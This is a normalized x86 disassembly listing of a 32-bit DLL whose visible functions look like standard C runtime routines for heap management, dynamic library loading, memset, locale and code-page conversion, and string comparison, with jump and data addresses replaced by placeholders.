mov [ rw-data ] eax
mov [ rw-data ] eax
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_1000cbf1
push 0xc
push r--data
call sub_10005acc
call sub_10007f63
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_1000cb15
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000cc27
mov eax [ ebp - 0x1c ]
call sub_10005b11
retn
sub_1000cca2
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ esp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ esp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
retn
sub_1000cce3
push 0x20
push r--data
call sub_10005acc
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_100044a7
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_10005b11
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_1000cca2
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_10008180
mov [ ebp - 0x1c ] 0x1
push eax
call sub_10004320
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_100049cb
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000496c
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_100072ab
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_10004317
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000ce57
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_1000cea7
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
call sub_10004317
xor ebx ebx
cmp [ rw-data ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
jne r-xdata
mov eax [ rw-data ]
mov esi [ ebp - 0x10 ]
cmp eax esi
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push [ rw-data ]
call sub_10004320
pop ecx
call eax
push eax
call sub_10004320
pop ecx
call eax
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
push eax
call sub_10004320
pop ecx
call eax
cmp eax ebx
je r-xdata
push eax
call sub_100042b4
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_100042b4
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_100042b4
mov [ rw-data ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_10007fad
test eax eax
pop ecx
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_10007fe4
test eax eax
pop ecx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push 0xc
lea ecx [ ebp - 0x20 ]
push ecx
push 0x1
push eax
push [ rw-data ]
call sub_10004320
pop ecx
call eax
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10004870
add esp 0x14
push [ ebp - 0x4 ]
push eax
call sub_10004320
pop ecx
call eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10004870
add esp 0x14
test [ ebp - 0x18 ] 0x1
jne r-xdata
push r--data
push edi
call esi
push eax
call sub_100042b4
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
or [ ebp + 0x10 ] 0x40000
jmp r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
push r--data
push edi
call esi
push eax
call sub_100042b4
pop ecx
mov [ rw-data ] eax
sub_1000d045
mov ecx [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_100049cb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
or eax 0xffffffff
pop esi
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop esi
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop esi
retn
sub_1000d08b
push 0xc
push r--data
call sub_10005acc
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_100049cb
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_1000496c
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_10005b11
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_100083cf
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_100072ab
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_10007af8
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d187
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_10008c10
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_1000d1a9
push 0x10
push r--data
call sub_10005acc
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_100033fd
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_100063a9
pop ecx
jmp r-xdata
call sub_10005b11
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_100083cf
pop ecx
call sub_100049cb
push 0x4
call sub_100072ab
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_10007324
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d2ed
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_10007819
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_100083cf
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_10007af8
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_100049cb
call sub_100049cb
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_100083cf
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10004990
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_100049cb
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_100049cb
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_10006dd0
push ebx
call sub_10007324
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_1000734f
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10004990
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_10006dd0
push ebx
push [ ebp - 0x20 ]
call sub_1000734f
add esp 0x14
mov eax esi
sub_1000d3c4
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_1000d41b
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_1000d41b
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_1000d3c4
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_1000d4aa
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_1000d7e4
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100026a8
leave
retn
sub_1000d4f1
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
cmp eax [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
test eax eax
mov ebx [ MultiByteToWideChar@IAT ]
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100026a8
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_10008c10
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
cmp esi 0xffffffff
mov [ ebp - 0x2c ] 0x1
jne r-xdata
push [ ebp - 0x1c ]
call sub_10008c8a
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_100033fd
cmp eax edi
pop ecx
je r-xdata
call sub_1000d6b0
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_10004ac0
mov esi eax
pop ecx
inc esi
cmp [ ebp - 0x2c ] edi
mov ebx [ WideCharToMultiByte@IAT ]
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_100084a8
cmp eax edi
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_100063a9
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_1000d6dc
mov edx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_1000d711
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_100027e4
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_100049cb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_1000d6dc
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000d8a5
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000d8a5
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_1000d800
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_1000d82d
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100027e4
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_10004b4b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1000d87c
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ esp + 0x8 ]
call sub_1000d82d
pop ecx
pop ecx
retn
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
retn
sub_1000d8a5
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_100027e4
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_100049cb
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1000a174
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_10004b4b
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
jne r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx [ ebp - 0x7 ]
xor eax eax
mov ah [ ebp - 0x8 ]
or eax ecx
movzx eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10009047
add esp 0x24
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000d9bc
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ esp + 0x8 ]
call sub_1000d8a5
pop ecx
pop ecx
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
retn
add eax 0x20
retn
sub_1000d9e3
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_100027e4
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10004c7f
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_100096f0
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100026a8
leave
retn
sub_1000da89
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_100027e4
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10004c7f
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_10009c32
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100026a8
leave
retn
sub_1000db2f
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
push edi
mov edi [ ecx + 0xc ]
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_100049cb
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_100049cb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000496c
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_10004ac0
inc eax
push eax
push edi
push esi
call sub_1000c7b0
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_1000dbec
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
test ebx ebx
mov [ ebp - 0x4 ] esi
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
test esi edx
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
